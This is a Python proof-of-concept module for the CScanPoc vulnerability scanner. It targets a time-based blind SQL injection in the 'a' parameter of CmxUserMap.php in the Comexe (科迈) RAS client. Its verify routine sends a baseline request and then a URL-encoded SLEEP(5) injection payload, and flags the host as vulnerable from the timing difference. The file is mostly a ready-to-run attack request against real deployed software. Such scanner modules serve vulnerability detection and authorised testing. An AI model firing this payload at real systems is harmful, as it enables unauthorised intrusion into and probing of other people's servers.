# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Comexe_0008'  # 平台漏洞编号，留空
    name = '科迈RAS标准版客户端CmxUserMap.php页面a参数注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-06'  # 漏洞公布时间
    desc = '''
        科迈RAS 为企业提供了一种从中心点集中管理应用程序远程接入方法。
        科迈RAS标准版客户端 CmxUserMap.php页面a参数注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0117921'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '科迈RAS系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1b8c949b-36e2-4461-b4f4-a044d641a748'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/Server/CmxUserMap.php?t=&a=123&b=32&c=undefined&d='
            target = arg + payload
            fst_sta = time.time()
            code, head, res, errcode, _ = hh.http(target)
            fst_end = time.time()

            payload = "/Server/CmxUserMap.php?t=&a=123%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20%27aSBL%27=%27aSBL&b=32&c=undefined&d="
            target = arg+payload
            sec_sta = time.time()
            code1, head1, res1, errcode1, _ = hh.http(target)
            sec_end = time.time()

            fst = fst_end-fst_sta
            sec = sec_end-sec_sta

            if code == code1 and fst < 2 and sec > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
